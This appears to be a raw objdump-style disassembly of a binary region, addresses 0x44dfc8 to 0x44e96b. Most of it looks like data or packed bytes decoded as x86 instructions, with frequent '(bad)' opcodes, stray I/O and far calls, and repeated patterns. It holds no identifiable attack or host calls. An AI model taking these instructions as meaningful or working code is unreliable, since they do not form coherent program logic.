  44dfc8:	add    DWORD PTR [eax],esp
  44dfca:	push   ebx
  44dfcb:	and    edi,eax
  44dfcd:	xor    BYTE PTR [esi],ch
  44dfcf:	or     eax,0xd4edb
  44dfd4:	mov    ds:0xdb234c03,eax
  44dfd9:	push   eax
	...
  44dff6:	add    BYTE PTR [eax],al
  44dff8:	xor    ebp,DWORD PTR [esi+eiz*4]
  44dffb:	and    al,0x38
  44dffd:	sub    ah,cl
  44dfff:	inc    eax
  44e000:	daa    
  44e001:	adc    al,0xb5
  44e003:	sub    al,0xd2
  44e005:	sub    DWORD PTR [eax],eax
  44e007:	iret   
  44e008:	sbb    ebp,DWORD PTR [edi]
  44e00a:	add    BYTE PTR [ebp+0x11],dh
  44e00d:	inc    ecx
  44e00e:	push   0xffffff9d
  44e010:	sub    eax,0x3a846a2a
  44e015:	dec    ebx
  44e016:	arpl   WORD PTR [ebp-0x6aa0ec41],bx
  44e01c:	sbb    eax,0xfa883d2b
  44e021:	sub    ebx,DWORD PTR [esi-0x78]
  44e024:	out    dx,eax
  44e025:	and    dl,BYTE PTR [ecx-0x17]
  44e028:	push   cs
  44e029:	dec    ebx
  44e02a:	add    BYTE PTR [ecx+0x287013ea],ah
  44e030:	in     eax,dx
  44e031:	and    ecx,DWORD PTR [esi+0x44]
  44e034:	loopne 0x44e042
  44e036:	arpl   WORD PTR [edx-0x23],bx
  44e039:	inc    edi
  44e03a:	arpl   WORD PTR [eax-0x13],cx
  44e03d:	sbb    al,0x6e
  44e03f:	cmp    al,dl
  44e041:	(bad)  
  44e042:	call   FWORD PTR [ebx+0xe]
  44e045:	aas    
  44e046:	push   0x3d
  44e048:	sub    al,0x26
  44e04a:	push   0x44
  44e04c:	cmp    eax,0x3f0c7347
  44e051:	cmovns ebx,DWORD PTR [ecx]
  44e054:	sbb    eax,0x4807691f
  44e059:	add    BYTE PTR [eax],al
  44e05b:	outs   dx,DWORD PTR ds:[esi]
	...
  44e078:	add    BYTE PTR [eax],al
  44e07a:	push   cs
  44e07b:	aas    
  44e07c:	push   0xfffffffd
  44e07e:	sub    eax,0xfd046a26
  44e083:	inc    esi
  44e084:	jae    0x44e092
  44e086:	dec    DWORD PTR [esi]
  44e088:	dec    ecx
  44e089:	stc    
  44e08a:	jmp    0x0:0x43d7691e
  44e091:	test   DWORD PTR [esi],ecx
  44e093:	aas    
  44e094:	push   0xffffffdd
  44e096:	in     eax,dx
  44e097:	and    eax,0x44eac46a
  44e09c:	arpl   WORD PTR [eax],ax
  44e09e:	push   eax
  44e09f:	inc    edx
  44e0a0:	outs   dx,DWORD PTR ds:[si]
  44e0a2:	pop    edi
  44e0a3:	hlt    
  44e0a4:	pop    esp
  44e0a5:	inc    ecx
  44e0a6:	je     0x44e0ab
  44e0a8:	dec    edi
  44e0a9:	dec    ecx
  44e0aa:	call   0x5cad:0xb04545d4
  44e0b1:	ins    BYTE PTR es:[edi],dx
  44e0b2:	cwde   
  44e0b3:	add    eax,DWORD PTR [edi+0x4c]
  44e0b6:	mov    cl,0x3c
  44e0b8:	dec    ebp
  44e0b9:	push   esp
  44e0ba:	aaa    
  44e0bb:	xchg   ecx,eax
  44e0bc:	es fs js 0x44e0af
  44e0c0:	(bad)  
  44e0c1:	dec    DWORD PTR [ebx+0x2]
  44e0c4:	inc    esi
  44e0c5:	shr    BYTE PTR gs:[edi],0x6b
  44e0c9:	gs mov dh,0xd5
  44e0cc:	pop    esp
  44e0cd:	je     0x44e0cc
  44e0cf:	in     eax,dx
  44e0d0:	pop    ebp
  44e0d1:	outs   dx,DWORD PTR ds:[esi]
  44e0d2:	xor    al,0x3
  44e0d4:	pop    ebp
  44e0d5:	add    dl,ch
  44e0d7:	div    BYTE PTR [ebx+0x41]
  44e0da:	mov    ah,0xfa
  44e0dc:	cmp    DWORD PTR [ebp+0x0],esi
	...
  44e0fb:	add    dl,al
  44e0fd:	cmc    
  44e0fe:	pop    esp
  44e0ff:	jb     0x44e133
  44e101:	rcr    BYTE PTR [ebp+eiz*2-0xc],cl
  44e105:	add    dh,ch
  44e107:	add    BYTE PTR [edx],bl
  44e109:	div    DWORD PTR [ebx+0x55]
  44e10c:	pop    ss
  44e10d:	imul   DWORD PTR [ecx+0x45]
  44e110:	sbb    ah,bh
  44e112:	add    BYTE PTR fs:[edx],ch
  44e115:	xlat   BYTE PTR ds:[ebx]
  44e116:	push   ebx
  44e117:	inc    ecx
  44e118:	adc    al,0xdb
  44e11a:	sub    dh,BYTE PTR [edx]
  44e11c:	mov    edx,0xb46c6bf6
  44e121:	add    dh,BYTE PTR [esi]
  44e123:	add    bl,dh
  44e125:	div    BYTE PTR [ebx+0x41]
  44e128:	adc    bl,ah
  44e12a:	outs   dx,DWORD PTR ds:[esi]
  44e12b:	je     0x44e0ee
  44e12d:	shr    BYTE PTR [edx+0x41],1
  44e130:	shl    dh,1
  44e132:	imul   esp,DWORD PTR [ebp+0xd],0x1e632fba
  44e139:	test   eax,0x513d46fc
  44e13e:	xor    BYTE PTR [eax-0x34],dl
  44e141:	js     0x44e178
  44e143:	sub    cl,cl
  44e145:	pop    esp
  44e146:	xor    BYTE PTR [eax],al
  44e148:	or     eax,0xe858fd6f
  44e14d:	jp     0x44e17d
  44e14f:	push   0xfffffffa
  44e151:	test   al,0xfc
  44e153:	in     eax,0x9
  44e155:	jl     0x44e170
  44e157:	imul   ebp,esi,0x78
  44e15a:	and    eax,0xffef0d00
  44e15f:	push   0x0
	...
  44e17d:	add    BYTE PTR [eax-0x469cd07d],dh
  44e183:	test   al,0xfc
  44e185:	sti    
  44e186:	jbe    0x440454b8
  44e18c:	pop    ds
  44e18d:	pop    edi
  44e18e:	mov    ecx,0x9e70444
  44e193:	cmp    al,0x19
  44e195:	imul   ebp,DWORD PTR [esi+0xd0033d3],0x1f
  44e19c:	add    BYTE PTR [ecx-0x80],bl
  44e19f:	inc    ebx
  44e1a0:	xor    BYTE PTR [ecx+0x7a],ch
  44e1a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e1a4:	cld    
  44e1a5:	jmp    0x44e1b8
  44e1a7:	aam    0x18
  44e1a9:	imul   esp,DWORD PTR [eax-0x12],0x29
  44e1ad:	arpl   WORD PTR ds:0x596cf98b,cx
  44e1b3:	stc    
  44e1b4:	push   ds
  44e1b5:	imul   ebx,DWORD PTR [ebp-0x59],0xfffffffc
  44e1b9:	out    0x9,eax
  44e1bb:	in     al,dx
  44e1bc:	sbb    BYTE PTR [ebx+0x2e],ch
  44e1bf:	out    dx,eax
  44e1c0:	sub    eax,0xf8960d00
  44e1c5:	pop    esi
  44e1c6:	das    
  44e1c7:	call   0x2ec2:0xe9bfc
  44e1ce:	cmp    DWORD PTR [edx+ecx*8],ecx
  44e1d1:	and    cl,BYTE PTR ds:0x34002100
  44e1d7:	push   cs
  44e1d8:	(bad)  
  44e1d9:	adc    eax,0x1ab5101c
  44e1de:	test   DWORD PTR [ebx],0x3c1
	...
  44e200:	push   ebp
  44e201:	add    DWORD PTR [edx-0x48da17d3],edx
  44e207:	xor    edx,ebp
  44e209:	and    eax,0xd1d9b
  44e20e:	nop
  44e20f:	inc    ebp
  44e211:	or     al,0x9b
  44e213:	adc    al,0xf2
  44e215:	(bad)  
  44e216:	jnp    0x44e248
  44e218:	fbld   TBYTE PTR [eax]
  44e21a:	jne    0x44e24b
  44e21c:	neg    DWORD PTR [ebx]
  44e21e:	mov    edx,DWORD PTR [edi]
  44e220:	or     eax,0xc9ff8900
  44e225:	sbb    dh,BYTE PTR [ebx+0x3d]
  44e228:	stos   BYTE PTR es:[edi],al
  44e229:	and    ecx,DWORD PTR [esp+esi*1-0x4c]
  44e22d:	es dec ecx
  44e22f:	sbb    BYTE PTR [esi-0x6dfc18ef],ch
  44e235:	add    DWORD PTR [edx],ebx
  44e237:	sbb    DWORD PTR [ecx+0x51183c0f],ebx
  44e23d:	sbb    eax,DWORD PTR [ebp+0x19]
  44e240:	ins    BYTE PTR es:[edi],dx
  44e241:	xor    DWORD PTR [ebx],edi
  44e243:	push   ss
  44e244:	jb     0x44e26c
  44e246:	inc    edx
  44e247:	inc    ebp
  44e248:	or     eax,0x5b07ff00
  44e24d:	or     al,0xb
  44e24f:	cmp    DWORD PTR [edi+0xd],esi
  44e252:	add    BYTE PTR [edx],dh
  44e254:	jno    0x44e256
  44e256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e257:	add    eax,0x46fb1b4c
  44e25c:	ds adc dh,ch
  44e25f:	sub    BYTE PTR [edi],dh
  44e261:	or     al,0x0
  44e263:	sbb    DWORD PTR [eax],eax
	...
  44e281:	add    BYTE PTR [ebx],ah
  44e283:	daa    
  44e284:	pop    ebp
  44e285:	add    al,0x1a
  44e287:	and    eax,DWORD PTR [eax]
  44e289:	cmp    dl,BYTE PTR ds:0xe9d16a31
  44e28f:	sub    DWORD PTR [ebp+eax*8-0x1b],esp
  44e293:	sbb    eax,DWORD PTR [ebx-0x2f]
  44e296:	jmp    0x44e2b8
  44e298:	jo     0x44e257
  44e29a:	cmp    DWORD PTR [edi],esp
  44e29c:	push   0xffffffa7
  44e29e:	xor    DWORD PTR [esp+esi*2],esp
  44e2a1:	int3   
  44e2a2:	and    BYTE PTR [eax],al
  44e2a4:	add    BYTE PTR [ebp+eax*1+0x259d6343],al
  44e2ab:	sub    ch,BYTE PTR [eax-0x78]
  44e2ae:	sbb    al,0x1c
  44e2b0:	ins    BYTE PTR es:[edi],dx
  44e2b1:	mov    WORD PTR [edx],?
  44e2b3:	inc    ecx
  44e2b4:	js     0x44e240
  44e2b6:	and    eax,0xff907410
  44e2bb:	sub    DWORD PTR [edx-0x70],eax
  44e2be:	repnz or esp,DWORD PTR [ebx+0x7b]
  44e2c2:	push   cs
  44e2c3:	cmp    bh,bh
  44e2c5:	(bad)  
  44e2c6:	in     eax,0x17
  44e2c8:	pop    ebp
  44e2c9:	dec    esp
  44e2ca:	add    DWORD PTR [ecx+ebx*2],ecx
  44e2cd:	push   ecx
  44e2ce:	call   0xe48a46fc
  44e2d3:	and    eax,0xee92d
  44e2d8:	add    cl,ch
  44e2da:	push   cs
  44e2db:	add    BYTE PTR [eax],al
  44e2dd:	jmp    0xe944e2f0
  44e2e2:	push   cs
  44e2e3:	add    BYTE PTR [eax],al
  44e2e5:	jmp    0x44e2ea
	...
  44e302:	add    BYTE PTR [eax],al
  44e304:	push   cs
  44e305:	add    BYTE PTR [eax],al
  44e307:	jmp    0xe944e31a
  44e30c:	push   cs
  44e30d:	add    BYTE PTR [eax],al
  44e30f:	jmp    0xe944e322
  44e314:	push   cs
  44e315:	add    BYTE PTR [eax],al
  44e317:	add    BYTE PTR [edi+edi*8-0x4b0001],dh
  44e31e:	(bad)  
  44e31f:	jmp    DWORD PTR [edi+edi*8-0x5b0001]
  44e326:	(bad)  
  44e327:	push   DWORD PTR [edi+edi*8-0x4b0001]
  44e32e:	(bad)  
  44e32f:	jmp    DWORD PTR [edi+edi*8-0x5b0001]
  44e336:	(bad)  
  44e337:	push   DWORD PTR [edi+edi*8-0x1]
  44e33b:	push   DWORD PTR [edi+edi*8-0x1]
  44e33f:	jmp    DWORD PTR [edi+edi*8-0x1]
  44e343:	jmp    DWORD PTR [edi+edi*8-0x1]
  44e347:	push   DWORD PTR [edi+edi*8-0x1]
  44e34b:	push   DWORD PTR [edi+edi*8-0x1]
  44e34f:	jmp    DWORD PTR [edi+edi*8-0x1]
  44e353:	jmp    DWORD PTR [edi+edi*8-0x1]
  44e357:	push   DWORD PTR [edi+edi*8]
  44e35a:	(bad)  
  44e35b:	push   DWORD PTR [edi+edi*8]
  44e35e:	(bad)  
  44e35f:	jmp    DWORD PTR [edi+edi*8]
  44e362:	(bad)  
  44e363:	jmp    DWORD PTR [edi+edi*8]
  44e366:	(bad)  
  44e367:	inc    DWORD PTR [eax]
	...
  44e385:	add    BYTE PTR [edi+edi*8],dh
  44e388:	(bad)  
  44e389:	push   DWORD PTR [edi+edi*8]
  44e38c:	(bad)  
  44e38d:	jmp    DWORD PTR [edi+edi*8]
  44e390:	(bad)  
  44e391:	jmp    DWORD PTR [edi+edi*8]
  44e394:	(bad)  
  44e395:	push   esp
  44e397:	(bad)  
  44e398:	(bad)  
  44e399:	push   esp
  44e39b:	(bad)  
  44e39c:	(bad)  
  44e39d:	jmp    esp
  44e39f:	(bad)  
  44e3a0:	(bad)  
  44e3a1:	jmp    esp
  44e3a3:	(bad)  
  44e3a4:	(bad)  
  44e3a5:	push   esp
  44e3a7:	(bad)  
  44e3a8:	(bad)  
  44e3a9:	push   esp
  44e3ab:	(bad)  
  44e3ac:	(bad)  
  44e3ad:	dec    DWORD PTR ds:0xdfffca9
  44e3b3:	test   eax,0xa90dfffc
  44e3b8:	cld    
  44e3b9:	dec    DWORD PTR ds:0xdfffca9
  44e3bf:	test   eax,0xa90dfffc
  44e3c4:	cld    
  44e3c5:	dec    DWORD PTR ds:0xdfffca9
  44e3cb:	test   eax,0xa90dfffc
  44e3d0:	cld    
  44e3d1:	dec    DWORD PTR ds:0xdfffca9
  44e3d7:	test   eax,0xa90dfffc
  44e3dc:	cld    
  44e3dd:	dec    DWORD PTR ds:0xdfffca9
  44e3e3:	test   eax,0xa90dfffc
  44e3e8:	cld    
  44e3e9:	inc    DWORD PTR [eax]
	...
  44e407:	add    BYTE PTR ds:0xdfffca9,cl
  44e40d:	test   eax,0xa90dfffc
  44e412:	cld    
  44e413:	dec    DWORD PTR ds:0xdfffca9
  44e419:	test   eax,0xa90dfffc
  44e41e:	cld    
  44e41f:	dec    DWORD PTR ds:0xdfffca9
  44e425:	test   eax,0xa90dfffc
  44e42a:	cld    
  44e42b:	dec    DWORD PTR ds:0xdfffca9
  44e431:	test   eax,0xa70dfffc
  44e436:	cld    
  44e437:	dec    DWORD PTR ds:0xdfffca7
  44e43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e43e:	cld    
  44e43f:	dec    DWORD PTR ds:0xdfffca7
  44e445:	add    bh,ah
  44e447:	add    ecx,DWORD PTR ds:0xd03e700
  44e44d:	add    bh,ah
  44e44f:	add    ecx,DWORD PTR ds:0xd03e700
  44e455:	add    bh,ah
  44e457:	add    ecx,DWORD PTR ds:0xd03e700
  44e45d:	add    bh,ah
  44e45f:	add    ecx,DWORD PTR ds:0xd03e700
  44e465:	add    bh,ah
  44e467:	add    ecx,DWORD PTR ds:0x3e700
	...
  44e489:	add    BYTE PTR ds:0xd03e700,cl
  44e48f:	add    bh,ah
  44e491:	add    ecx,DWORD PTR ds:0xd03e700
  44e497:	add    bh,ah
  44e499:	add    ecx,DWORD PTR ds:0xd03e700
  44e49f:	add    bh,ah
  44e4a1:	add    ecx,DWORD PTR ds:0xd03e700
  44e4a7:	add    bh,ah
  44e4a9:	add    ecx,DWORD PTR ds:0xcd440f00
  44e4af:	(bad)  
  44e4b0:	ds inc ebp
  44e4b2:	int    0xff
  44e4b4:	out    0x2,eax
  44e4b6:	or     eax,0xd02d900
  44e4bb:	add    dl,ah
  44e4bd:	add    ecx,DWORD PTR ds:0xcd4b6f00
  44e4c3:	call   DWORD PTR [esi]
  44e4c5:	inc    ebx
  44e4c6:	int    0xff
  44e4c8:	out    0x3,al
  44e4ca:	or     eax,0xd03f100
  44e4cf:	add    dl,bl
  44e4d1:	add    ecx,DWORD PTR ds:0xd03e700
  44e4d7:	add    BYTE PTR [edi+0x4d43],cl
  44e4dd:	jmp    0xda44e4f0
  44e4e2:	push   cs
  44e4e3:	add    BYTE PTR [eax],al
  44e4e5:	out    dx,al
  44e4e6:	push   cs
  44e4e7:	add    BYTE PTR [eax],al
  44e4e9:	jmp    0xe844e4fc
	...
  44e50a:	add    BYTE PTR [eax],al
  44e50c:	push   cs
  44e50d:	add    BYTE PTR [eax],al
  44e50f:	pop    ds
  44e510:	jae    0x44e4e2
  44e512:	mov    ah,0x38
  44e514:	rcl    BYTE PTR [edi+0x43],0xe9
  44e518:	push   cs
  44e519:	add    BYTE PTR [eax],al
  44e51b:	leave  
  44e51c:	add    eax,0xee91683
  44e521:	add    BYTE PTR [eax],al
  44e523:	jmp    0xe944e536
  44e528:	push   cs
  44e529:	add    BYTE PTR [eax],al
  44e52b:	jmp    0xe844e53a
  44e530:	stos   BYTE PTR es:[edi],al
  44e531:	xchg   edi,eax
  44e532:	clc    
  44e533:	cld    
  44e534:	push   cs
  44e535:	add    BYTE PTR [eax],al
  44e537:	repnz push cs
  44e539:	add    BYTE PTR [eax],al
  44e53b:	test   eax,0x2e00000e
  44e540:	push   cs
  44e541:	add    BYTE PTR [eax],al
  44e543:	imul   ecx,DWORD PTR [ecx],0x7a680000
  44e549:	xchg   edi,eax
  44e54a:	clc    
  44e54b:	icebp  
  44e54c:	push   cs
  44e54d:	add    BYTE PTR [eax],al
  44e54f:	loope  0x44e55f
  44e551:	add    BYTE PTR [eax],al
  44e553:	leave  
  44e554:	push   cs
  44e555:	add    BYTE PTR [eax],al
  44e557:	jle    0x44e567
  44e559:	add    BYTE PTR [eax],al
  44e55b:	jmp    0xe944e56e
  44e560:	push   cs
  44e561:	add    BYTE PTR [eax],al
  44e563:	jmp    0xe97d7816
  44e568:	push   cs
  44e569:	add    BYTE PTR [eax],al
  44e56b:	jmp    0xe944e57e
	...
  44e58c:	add    BYTE PTR [eax],al
  44e58e:	(bad)  
  44e58f:	add    al,BYTE PTR [eax+0x0]
  44e592:	hlt    
  44e593:	add    eax,DWORD PTR [eax]
  44e595:	add    ah,ah
  44e597:	add    eax,DWORD PTR [eax]
  44e599:	add    ah,ah
  44e59b:	imul   eax,DWORD PTR [eax],0x3f440
  44e5a1:	add    ah,dh
  44e5a3:	add    eax,DWORD PTR [eax]
  44e5a5:	add    BYTE PTR [eax+eax*4],ah
  44e5a8:	add    al,0x40
  44e5aa:	in     al,0x3
  44e5ac:	add    BYTE PTR [eax],al
  44e5ae:	mov    ah,0x3
  44e5b0:	add    BYTE PTR [eax],al
  44e5b2:	and    al,0xc3
  44e5b4:	pop    es
  44e5b5:	inc    eax
  44e5b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e5b7:	add    eax,DWORD PTR [eax]
  44e5b9:	add    BYTE PTR [ebx+eax*1+0x77d00000],ah
  44e5c0:	or     al,BYTE PTR [eax-0x4c]
  44e5c3:	add    eax,DWORD PTR [eax]
  44e5c5:	add    BYTE PTR [ebx+eax*1+0xb128000],ah
  44e5cc:	cmovo  esi,DWORD PTR [ebx+eax*1+0x0]
  44e5d1:	add    BYTE PTR [ebx+eax*1+0x0],dh
  44e5d5:	and    al,bh
  44e5d7:	sub    al,0x12
  44e5d9:	inc    eax
  44e5da:	add    eax,DWORD PTR fs:[eax]
  44e5dd:	add    BYTE PTR [edi+eax*1-0x49],dh
  44e5e1:	leave  
  44e5e2:	movd   DWORD PTR [eax+eax*2],mm5
  44e5e6:	add    eax,DWORD PTR fs:[eax]
  44e5e9:	mov    eax,ds:0x1bc6bf09
  44e5ee:	not    BYTE PTR [ecx+0x46]
  44e5f1:	inc    eax
	...
  44e60e:	add    BYTE PTR [eax],al
  44e610:	push   esp
  44e611:	jae    0x44e5a9
  44e613:	mov    ch,0xb4
  44e615:	cdq    
  44e616:	mov    al,ds:0x617fe1ad
  44e61b:	inc    eax
  44e61c:	add    al,0x40
  44e61e:	cmc    
  44e61f:	and    eax,0x4f868a51
  44e624:	or     eax,0xd407b59
  44e629:	sub    BYTE PTR [edx-0x30],dh
  44e62c:	mov    al,ds:0x900309d9
  44e631:	out    dx,eax
  44e632:	push   0xffffff99
  44e634:	dec    ebp
  44e635:	rcr    BYTE PTR [edx-0x61],0x49
  44e639:	les    edi,FWORD PTR [ebp+ecx*1-0x66]
  44e63d:	pop    ss
  44e63e:	jle    0x44e5f6
  44e640:	dec    ebp
  44e641:	es loopne 0x44e616
  44e644:	mov    bl,0x5d
  44e646:	call   0x4dcc:0xbdf0f246
  44e64d:	mov    es,edx
  44e64f:	fist   WORD PTR [ecx+0x52c6836f]
  44e655:	inc    ebx
  44e656:	outs   dx,DWORD PTR ds:[esi]
  44e657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e658:	dec    esp
  44e659:	aad    0x80
  44e65b:	fs inc eax
  44e65d:	(bad)  
  44e65e:	aad    0x8a
  44e660:	call   0xb86d:0x4f7b9ca8
  44e667:	mov    DWORD PTR [ebx+0x76f4792f],esi
  44e66d:	mov    esi,0x77ce4e66
  44e672:	mov    eax,ds:0x71
	...
  44e68f:	add    BYTE PTR [eax],al
  44e691:	add    BYTE PTR [esi-0x24],ch
  44e694:	lea    esp,[esi]
  44e696:	and    bl,BYTE PTR ds:0xd1217d
  44e69c:	hlt    
  44e69d:	adc    BYTE PTR [edi+0x6e0f69e0],dh
  44e6a3:	jecxz  0x44e66c
  44e6a5:	cmc    
  44e6a6:	leave  
  44e6a7:	add    DWORD PTR [ebx-0x2d],esp
  44e6aa:	ds cmc 
  44e6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e6ad:	(bad)  
  44e6af:	xor    BYTE PTR [ecx-0x38],0xd0
  44e6b3:	or     eax,0xffffffc0
  44e6b6:	pushf  
  44e6b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e6b8:	bound  ebp,QWORD PTR [ecx-0x63605093]
  44e6be:	retf   
  44e6bf:	push   ebx
  44e6c1:	es cld 
  44e6c3:	sti    
  44e6c4:	push   ebx
  44e6c5:	or     DWORD PTR [esp+edx*1+0x3b52cb59],0x2f
  44e6cd:	inc    edx
  44e6ce:	jmp    0x421f3c38
  44e6d3:	sar    DWORD PTR [esi+0x51],cl
  44e6d6:	out    0x31,eax
  44e6d8:	and    al,0x65
  44e6da:	out    dx,eax
  44e6db:	sub    ebp,esp
  44e6dd:	mov    BYTE PTR [edi-0x37],0x6d
  44e6e1:	jge    0x44e66b
  44e6e3:	sub    bl,BYTE PTR [edx+0x4790af3e]
  44e6e9:	jecxz  0x44e675
  44e6eb:	xor    al,0x44
  44e6ed:	(bad)  
  44e6ee:	std    
  44e6ef:	push   ds
  44e6f0:	cwde   
  44e6f1:	sahf   
  44e6f2:	xchg   ecx,eax
  44e6f3:	sub    ch,BYTE PTR [esi-0x45]
	...
  44e712:	add    BYTE PTR [eax],al
  44e714:	out    dx,eax
  44e715:	sub    ah,BYTE PTR [eax-0x66]
  44e718:	shl    DWORD PTR ds:0x919a763d,0x9
  44e71f:	pop    ebp
  44e720:	js     0x44e6da
  44e722:	mov    ebx,0xa31e12be
  44e727:	retf   0x75a1
  44e72a:	push   es
  44e72b:	mov    al,BYTE PTR [eax+0x2fc7c72f]
  44e731:	adc    esp,edi
  44e733:	add    ecx,DWORD PTR ds:0x57cf2400
  44e739:	mov    esp,0xbc56cf1a
  44e73e:	xor    cl,bh
  44e740:	popa   
  44e741:	int    0x97
  44e743:	fimul  WORD PTR [eax]
  44e745:	mov    ch,0x45
  44e747:	adc    eax,DWORD PTR [esi]
  44e749:	cli    
  44e74a:	xor    DWORD PTR [eax+0x3a],esp
  44e74d:	int    0x9c
  44e74f:	daa    
  44e750:	add    BYTE PTR [ebp+0x1e9d8ea9],ch
  44e756:	add    bl,bl
  44e758:	lea    edx,[edx-0x26a2d5c8]
  44e75e:	bound  eax,QWORD PTR [eax]
  44e760:	jae    0x44e797
  44e762:	adc    DWORD PTR [esi-0x46c761a8],edx
  44e768:	push   ss
  44e769:	jmp    0x44e6ee
  44e76b:	add    al,BYTE PTR es:[eax-0x54]
  44e76f:	lods   al,BYTE PTR ds:[esi]
  44e770:	outs   dx,BYTE PTR ds:[esi]
  44e771:	xchg   edi,eax
  44e772:	cmp    BYTE PTR [ecx],ch
  44e774:	outs   dx,DWORD PTR ds:[esi]
  44e775:	dec    edi
  44e776:	inc    bp
	...
  44e794:	add    BYTE PTR [eax],al
  44e796:	jbe    0x44e79a
  44e798:	mov    ebx,0x38a38cf6
  44e79d:	fidiv  DWORD PTR [ebp-0x53dcc2b8]
  44e7a3:	mov    cl,0x93
  44e7a5:	push   esi
  44e7a6:	jg     0x44e747
  44e7a8:	cmp    BYTE PTR [ebx+0x8c989a4],ch
  44e7ae:	(bad)  
  44e7af:	std    
  44e7b0:	jo     0x44e75f
  44e7b2:	and    ah,BYTE PTR [ecx+0x3352c638]
  44e7b8:	fistp  WORD PTR [ecx*8+0x6f7c9346]
  44e7bf:	lds    edi,FWORD PTR [eax]
  44e7c1:	jnp    0x44e790
  44e7c3:	cmp    esi,DWORD PTR ds:0x13b94adc
  44e7c9:	pop    DWORD PTR [ebx]
  44e7cb:	pop    eax
  44e7cc:	cmp    BYTE PTR [edi],ah
  44e7ce:	cs push esi
  44e7d0:	xchg   ebx,eax
  44e7d1:	add    ah,cl
  44e7d3:	pop    eax
  44e7d4:	sbb    DWORD PTR [eax+0x56],edi
  44e7d7:	jo     0x44e811
  44e7d9:	add    eax,0x65ddbe6a
  44e7de:	mov    ebx,0x83882ed3
  44e7e3:	adc    bh,BYTE PTR [ecx]
  44e7e5:	mov    ch,bh
  44e7e7:	xor    al,0xbf
  44e7e9:	(bad)  
  44e7ea:	fnstcw WORD PTR [ebx]
  44e7ec:	jl     0x44e7ee
  44e7ee:	push   esi
  44e7ef:	sub    eax,0x5a1b3f58
  44e7f4:	daa    
  44e7f5:	lea    edi,[edx]
  44e7f7:	mov    eax,DWORD PTR es:[ebp+0x0]
	...
  44e816:	add    BYTE PTR [eax],al
  44e818:	cmp    DWORD PTR [ebp+0x3c],ebp
  44e81b:	aas    
  44e81c:	or     BYTE PTR [ecx+0x1eede99d],ch
  44e822:	and    dl,ch
  44e824:	arpl   WORD PTR [ebx+eiz*1],bx
  44e827:	aas    
  44e828:	push   ecx
  44e829:	sbb    BYTE PTR [edx+0x7beb90e4],bl
  44e82f:	inc    esi
  44e830:	xchg   esp,eax
  44e831:	dec    eax
  44e832:	dec    ebp
  44e833:	ds push edi
  44e835:	jmp    0x44e834
  44e837:	retf   
  44e838:	pop    ss
  44e839:	shr    BYTE PTR [esi-0x7d],1
  44e83c:	mov    bl,0x14
  44e83e:	jp     0x44e87d
  44e840:	push   ebp
  44e841:	ins    DWORD PTR es:[edi],dx
  44e842:	xor    bl,BYTE PTR [ecx]
  44e844:	push   ds
  44e845:	jecxz  0x44e863
  44e847:	inc    ebx
  44e848:	in     eax,0xbf
  44e84a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e84b:	cmp    al,0xc5
  44e84d:	jl     0x44e818
  44e84f:	cmp    BYTE PTR [esi],ah
  44e851:	ds (bad) 
  44e853:	mov    eax,0x3bcf68b4
  44e858:	nop
  44e859:	ja     0x44e8ab
  44e85b:	or     BYTE PTR [edi],cl
  44e85d:	xor    eax,0x212ae3e1
  44e862:	cld    
  44e863:	cmp    bh,BYTE PTR [edx]
  44e865:	or     edi,DWORD PTR [esi]
  44e867:	inc    edx
  44e868:	imul   esi,DWORD PTR [ecx],0xffffff92
  44e86b:	jne    0x44e8e8
  44e86d:	dec    edx
  44e86e:	cmp    dh,BYTE PTR es:[edi-0xc]
  44e872:	sbb    edx,edx
  44e874:	pop    ss
  44e875:	dec    ebx
  44e876:	sub    ch,dh
  44e878:	lods   eax,DWORD PTR ds:[esi]
  44e879:	rcpps  xmm7,XMMWORD PTR [ecx]
	...
  44e898:	add    BYTE PTR [eax],al
  44e89a:	retf   0xb67d
  44e89d:	rcr    BYTE PTR [ebx+0xd829d4d],0x3b
  44e8a4:	arpl   WORD PTR [edx-0x51db0901],si
  44e8aa:	sbb    al,0x3a
  44e8ac:	xor    ebx,DWORD PTR [ecx+0xf4d5fc9]
  44e8b2:	stc    
  44e8b3:	mov    ebx,0x52f0e44b
  44e8b8:	enter  0xbe48,0x72
  44e8bc:	lds    esp,FWORD PTR [eax+ebp*8+0x19]
  44e8c0:	xor    eax,0xb558b104
  44e8c5:	mov    ebp,0xc1abae80
  44e8ca:	sbb    esp,DWORD PTR [ebx]
  44e8cc:	lahf   
  44e8cd:	xchg   DWORD PTR [edi-0xe],edx
  44e8d0:	ins    BYTE PTR es:[edi],dx
  44e8d1:	cmp    ebp,DWORD PTR [edx+0x51d82e8]
  44e8d7:	jmp    0x44e923
  44e8d9:	arpl   WORD PTR [edi+0x64],bp
  44e8dc:	or     BYTE PTR [eax+0x7a68a2a2],0x1c
  44e8e3:	jge    0x44e8c5
  44e8e5:	fldenv [edx+0x11c7b16a]
  44e8eb:	fs pop ebp
  44e8ed:	xlat   BYTE PTR ds:[ebx]
  44e8ee:	pop    es
  44e8ef:	cdq    
  44e8f0:	cld    
  44e8f1:	dec    DWORD PTR ds:0xd400e05
  44e8f7:	add    DWORD PTR [esi],ecx
  44e8f9:	inc    eax
  44e8fa:	or     eax,0x400ebd
	...
  44e91b:	add    BYTE PTR ds:0xd400eb9,cl
  44e921:	push   ebp
  44e922:	push   cs
  44e923:	inc    eax
  44e924:	or     eax,0xd400e51
  44e929:	ins    DWORD PTR es:[edi],dx
  44e92a:	push   cs
  44e92b:	inc    eax
  44e92c:	or     eax,0xd400e69
  44e931:	gs push cs
  44e933:	inc    eax
  44e934:	or     eax,0xd400e61
  44e939:	add    BYTE PTR [ebx-0x590032ef],ch
  44e93f:	adc    ebp,ecx
  44e941:	jmp    esi
  44e943:	add    ecx,DWORD PTR ds:0xd03e700
  44e949:	add    bh,ah
  44e94b:	add    ecx,DWORD PTR ds:0xd03e700
  44e951:	add    bh,ah
  44e953:	add    ecx,DWORD PTR ds:0xdbdcdf00
  44e959:	jmp    esi
  44e95b:	add    ecx,DWORD PTR ds:0xd03e700
  44e961:	add    bh,ah
  44e963:	add    ecx,DWORD PTR ds:0x3bb49d00
  44e969:	add    bh,ah
